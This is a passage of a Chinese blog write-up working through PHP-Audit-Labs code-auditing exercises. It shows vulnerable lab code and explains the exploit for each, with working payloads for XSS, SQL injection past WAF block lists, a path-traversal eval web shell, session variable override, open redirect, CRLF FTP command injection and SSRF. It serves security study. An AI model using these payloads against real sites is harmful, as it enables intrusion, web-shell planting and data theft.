变量进行处理</p><p>所以payload是<br><code>/?a&#39;onclick%3dalert(1)%2f%2f=c</code><br>绕过intval的同时执行了a标签的onclik事件,达成xss.</p><h3 id="练习-11"><a href="#练习-11" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM ctf.users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo $query;</span></span><br><span class="line"></span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($result))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . $row[<span class="string">'name'</span>] . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里首先要达成sql注入,自然比较关心是否能闭合单引号。但是注意到,此处的htmlentities严格转义了单双引号。不能进行闭合。</p><p>但是不用引号闭合的另外的办法就是非常常见的<code>\</code>进行转义。这样password的值就变成可控的注入位置了。</p><p>接下来比较关心的是代码中对username与password关键字的过滤。这里过滤很简单,其他盲注之类的方法当然可以做到。不过这里可以用到一个容易被忘记的小技巧:</p><blockquote><p>php.ini中默认<br>如果以 POST 、 GET 方式传入相同的变量，那么用 REQUEST 获取该变量的值将为 POST 该变量的值</p></blockquote><p>所以post数据会覆盖掉get的数据。我们用post传正常的payload、再用get执行sql语句即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get:username&#x3D;\&amp;password&#x3D;union select 1,flag,3,4 from ctf.users%23</span><br><span class="line"></span><br><span class="line">post: username&#x3D;1&amp;password&#x3D;2</span><br></pre></td></tr></table></figure><h2 id="Day13"><a href="#Day13" class="headerlink" title="Day13"></a>Day13</h2><h3 id="waf失效进行sql注入"><a href="#waf失效进行sql注入" class="headerlink" title="waf失效进行sql注入"></a>waf失效进行sql注入</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/14.png" alt></p><p>本题显然代码中存在sql语句拼接。但是只有一个addslashes,除非是二次注入否则不能利用。<br>然而代码中却出现了很弱智的检查<code>substr()</code>,其长度被定死为20.那么我们只要卡在这个点使用单引号就能导致转义失效了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;1234567890123456789&#39;&amp;passwd&#x3D;or 1&#x3D;1#</span><br></pre></td></tr></table></figure><p>在某CMS中,对sql语句进行了htmlentites处理。但是同时数据在传入前会进行一次urldecode。我们知道,在waf检测后再进行解码操作无疑是具有危害性的。(比如json_deocde如果在waf检测之后的话,就能用unicode绕过任意字符waf)</p><h3 id="练习-12"><a href="#练习-12" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dhtmlspecialchars</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_array($string)) &#123;</span><br><span class="line">          <span class="keyword">foreach</span> ($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">              $string[$key] = dhtmlspecialchars($val);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          $string = str_replace(<span class="keyword">array</span>(<span class="string">'&amp;'</span>, <span class="string">'"'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'('</span>, <span class="string">')'</span>), <span class="keyword">array</span>(<span class="string">'&amp;amp;'</span>, <span class="string">'&amp;quot;'</span>, <span class="string">'&amp;lt;'</span>, <span class="string">'&amp;gt;'</span>, <span class="string">'（'</span>, <span class="string">'）'</span>), $string);</span><br><span class="line">          <span class="keyword">if</span> (strpos($string, <span class="string">'&amp;amp;#'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">              $string = preg_replace(<span class="string">'/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/'</span>, <span class="string">'&amp;\\1'</span>, $string);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> $string;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dowith_sql</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">      $check = preg_match(<span class="string">'/select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is'</span>, $str);</span><br><span class="line">      <span class="keyword">if</span> ($check) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"非法字符!"</span>;</span><br><span class="line">          <span class="keyword">exit</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> $str;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 经过第一个waf处理</span></span><br><span class="line">  <span class="keyword">foreach</span> ($_REQUEST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">      $_REQUEST[$key] = dowith_sql($value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 经过第二个WAF处理</span></span><br><span class="line">  $request_uri = explode(<span class="string">"?"</span>, $_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($request_uri[<span class="number">1</span>])) &#123;</span><br><span class="line">      $rewrite_url = explode(<span class="string">"&amp;"</span>, $request_uri[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">foreach</span> ($rewrite_url <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">          $_value = explode(<span class="string">"="</span>, $value);</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">isset</span>($_value[<span class="number">1</span>])) &#123;</span><br><span class="line">              $_REQUEST[$_value[<span class="number">0</span>]] = dhtmlspecialchars(addslashes($_value[<span class="number">1</span>]));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 业务处理</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">      $user_id = $_REQUEST[<span class="string">'i_d'</span>];</span><br><span class="line">      $sql = <span class="string">"select * from ctf.users where id=$user_id"</span>;</span><br><span class="line">      $result=mysql_query($sql);</span><br><span class="line">      <span class="keyword">while</span>($row = mysql_fetch_array($result))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . $row[<span class="string">'name'</span>] . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个练习很有营养。用到了几个php的特性<br>1.传入的非法的 <code>$_GET</code> 数组参数名,PHP会将他们替换成下划线<br>2.传入多个相同参数时,php只会接受最后一个(类似js了)<br>3.<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>方式获得的参数，并不会对参数中的某些特殊字符进行替换</p><p>本题代码中,<code>$_REQUEST</code>的数据会经过<code>dowith_sql</code>处理。而之后第二个waf会对<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>进行<code>dhtmlspecialchars()</code>处理.</p><p>那么此处思路如下,使用payload<br><code>i_d=padyload&amp;i.d=123</code><br>经过第一次waf时，php会将参数中的某些特殊符号替换为下划线。因此便得到了两个i_d,其中不含恶意代码的<code>i_d</code>内容通过检查。<br>经过第二次waf时,由于代码是通过 $_SERVER[‘REQUEST_URI’] 取参数.检查的实际上是我们初始传入的payload。这里由于是数值型注入,所以可以直接union得到flag</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">submit&#x3D;&amp;i_d&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,flag,3,4&#x2F;**&#x2F;from&#x2F;**&#x2F;ctf.users&amp;i.d&#x3D;123</span><br></pre></td></tr></table></figure><h2 id="Day14"><a href="#Day14" class="headerlink" title="Day14"></a>Day14</h2><h3 id="变量覆盖-路径穿越"><a href="#变量覆盖-路径穿越" class="headerlink" title="变量覆盖+路径穿越"></a>变量覆盖+路径穿越</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/15.png" alt></p><p>这里的代码在析构函数里有写文件的方法。因此只要id可控就能控制路径。同时看到构造函数里存在变量覆盖，那么利用起来就不难了。<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&amp;shell&#x3D;&#39;,)%0a&lt;?&#x3D;eval($_REQUEST[byc]);?&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>因为实际上写入的内容是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">    &#39;id&#39;&#x3D;&gt;&#39;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;,</span><br><span class="line">    &#39;lost&#39;&#x3D;&gt;0,</span><br><span class="line">    &#39;bought&#39;&#x3D;&gt;0,</span><br><span class="line">    &#39;shell&#39;&#x3D;&gt;&#39;\&#39;,)</span><br><span class="line">    &lt;?&#x3D;eval($_REQUEST[byc]);?&gt;&#x2F;&#x2F;&#39;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>所以需要先闭合,换行后写shell注释即可。</p><p>某CMS中也出现了类似的变量覆盖漏洞。比如需要admin权限,而admin权限是由session数组的值决定的。因此可以直接<code>_SESSION[duomi_group_]=1&amp;_SESSION[duomi_admin_]=1</code>覆盖。<br>当然,前提是当前的php开启了<code>session_start()</code></p><h2 id="Day15"><a href="#Day15" class="headerlink" title="Day15"></a>Day15</h2><h3 id="PHP-SELF"><a href="#PHP-SELF" class="headerlink" title="PHP_SELF"></a>PHP_SELF</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/16.png" alt></p><p>关于<code>$_SERVER[&#39;PHP&#39;]</code>:<br><code>PHP_SELF</code>指当前的页面绝对地址,它是可以控制的.</p><p>同时代码中调用了一次urldecode,加上浏览器自带的一次解码,就可以通过二次url编码进行关键字绕过<br><code>http://www.test.com/index.php/http:%252f%252fblog.dyboy.cn?redirect=test&amp;params=test123</code><br>此处payload即可达成302跳转</p><p><code>PHP_SELF</code>这个考点之前zer0pts的题目中也有出现过</p><h3 id="练习-13"><a href="#练习-13" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"./flag.php"</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$black_list = <span class="string">"/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|"</span>;</span><br><span class="line">$black_list .= <span class="string">"=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i"</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match($black_list, $_GET[<span class="string">'user'</span>])) <span class="keyword">exit</span>(<span class="string">":P"</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match($black_list, $_GET[<span class="string">'pwd'</span>])) <span class="keyword">exit</span>(<span class="string">":P"</span>); </span><br><span class="line"></span><br><span class="line">$query=<span class="string">"select user from users where user='$_GET[user]' and pwd='$_GET[pwd]'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;"</span>;</span><br><span class="line">$result = $conn-&gt;query($query);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">'user'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Welcome &#123;$row['user']&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query(<span class="string">"select pwd from users where user='admin'"</span>);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $admin_pass = $row[<span class="string">'pwd'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(($admin_pass)&amp;&amp;($admin_pass === $_GET[<span class="string">'pwd'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没啥意思…跟之前校赛的套路题一样的。<code>regexp</code>进行注入<code>;%00</code>来注释。</p><h2 id="Day16"><a href="#Day16" class="headerlink" title="Day16"></a>Day16</h2><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/17.png" alt></p><p>本题主要是一个<code>$_REQUEST</code>的例子。从题目逻辑上看,首先可以知道是进行了一次ftp的连接,同时用<code>intval</code>来试图处理我们的输入。看似无法绕过。但是实际输出下就会发现有蹊跷: <code>$_REQUEST</code>的内容不受过滤函数影响。所以虽然<code>$_REQUEST</code> 内容是上述三个全局变量的合集,但实际上是不会受影响的。</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode&#x3D;1%0a%0dDELETE%20test.file</span><br></pre></td></tr></table></figure><p>1可以达成mode的判断。而后续的数据通过crlf被当做命令执行。删除了文件。</p><p>因此,需要注意<code>$_REQUEST</code>的使用。假如只对<code>GET,POST,COOKIE</code>三种进行过滤却在代码中拼接<code>REQUEST</code>是不可取的。</p><h3 id="练习-14"><a href="#练习-14" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https)?:\/\/.*(\/)?.*$/'</span>,$url);</span><br><span class="line">    <span class="keyword">if</span> (!$match_result)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $url_parse=parse_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error2'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>];</span><br><span class="line">    $ip=gethostbyname($hostname);</span><br><span class="line">    $int_ip=ip2long($ip);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span> || ip2long(<span class="string">'0.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $result_info = curl_getinfo($ch);</span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>])&#123;</span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_POST[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">    safe_request_url($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (! function_exists(<span class="string">'real_ip'</span>) ) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">real_ip</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">        <span class="keyword">if</span> (is_null($ip) &amp;&amp; <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) &amp;&amp; preg_match_all(<span class="string">'#\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;#s'</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>], $matches)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($matches[<span class="number">0</span>] <span class="keyword">AS</span> $xip) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!preg_match(<span class="string">'#^(10|172\.16|192\.168)\.#'</span>, $xip)) &#123;</span><br><span class="line">                    $ip = $xip;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_null($ip) &amp;&amp; <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>]) &amp;&amp; preg_match(<span class="string">'/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/'</span>, $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>])) &#123;</span><br><span class="line">            $ip = $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_null($ip) &amp;&amp; <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CF_CONNECTING_IP'</span>]) &amp;&amp; preg_match(<span class="string">'/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/'</span>, $_SERVER[<span class="string">'HTTP_CF_CONNECTING_IP'</span>])) &#123;</span><br><span class="line">            $ip = $_SERVER[<span class="string">'HTTP_CF_CONNECTING_IP'</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_null($ip) &amp;&amp; <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>]) &amp;&amp; preg_match(<span class="string">'/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/'</span>, $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>])) &#123;</span><br><span class="line">            $ip = $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ip;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$rip = real_ip();</span><br><span class="line"><span class="keyword">if</span>($rip === <span class="string">"127.0.0.1"</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"HRCTF&#123;SSRF_can_give_you_flag&#125;"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"You IP is &#123;$rip&#125; not 127.0.0.1"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个应该就是当初郁师傅经典ssrf的原型了。要求从内网ip 127.0.0.1访问flag.php才能得到flag.使用的自然是当初blackhatpdf中分享的关于php及curl间对url解析的差异</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;foo@localhost:80@www.bycsec.top&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>libcurl认第一个<code>@</code>后的作为host。php及其他语言都认最后一个<code>@</code>后的作为host.所以前面绕过内网ip限制。在后面成功执行了curl</p><h2 id="Day17"><a href="#Day17" class="headerlink" title="Day17"></a>Day17</h2><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/18.png" alt></p><h2 